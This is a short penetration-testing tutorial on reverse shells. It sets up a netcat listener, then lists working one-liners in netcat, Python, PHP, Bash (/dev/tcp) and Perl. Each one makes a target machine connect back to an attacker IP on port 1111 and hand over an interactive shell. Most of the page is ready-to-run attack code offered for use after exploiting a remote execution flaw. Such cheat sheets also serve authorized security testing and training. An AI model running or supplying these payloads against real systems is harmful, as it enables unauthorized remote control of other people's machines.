# Reverse shell

After finding a remote execution exploit, the next thing you may want to do is gain access to the remote machine. A technique to accomplish this is a reverse shell.

A reverse shell is when the remote host initiates a connection with the attacking machine. This technique is particularly useful when the target machine does not have a public IP address.

There are a number of ways this can be accomplished and it will depend on the tools and software available on the remote machine.

In the examples below, the host machine \(attacker\) IP is 192.168.0.100.

### Netcat

Netcat is not often installed on production systems but you never know you may be lucky. If it is, the version installed may not support the `-e` option. On Ubuntu, the better netcat package is distributed as `ncat`.

On the host machine, run start netcat listening on a port

```
nc -nlvp 1111
```

Now on the target machine, execute the following to open the reverse shell

```bash
nc -nv 192.168.0.100 -e /bin/bash
```

On the host machine, you can now run commands as the local user from the target.

{% hint style="info" %}
 The command listed here are aimed at linux/unix machines. If you are targeting a Windows machine then you can try substituting `/bin/bash` with `cmd.exe`.
{% endhint %}

### Python

The following code has been tested and works with both Python 2 and 3.

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.100",1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP

The following was tested with PHP 7.4. If it doesn’t work for you, try using a different file descriptor \(4, 5 or 6\).

```bash
php -r '$sock=fsockopen("192.168.0.100",1111);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Bash

This is a bit of a weird one as it echo’s out the command you typed as well as the result.

```bash
bash -i >& /dev/tcp/192.168.0.100/1111 0>&1
```

### Perl

```text
perl -e 'use Socket;$i="192.168.0.100";$p=1111;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

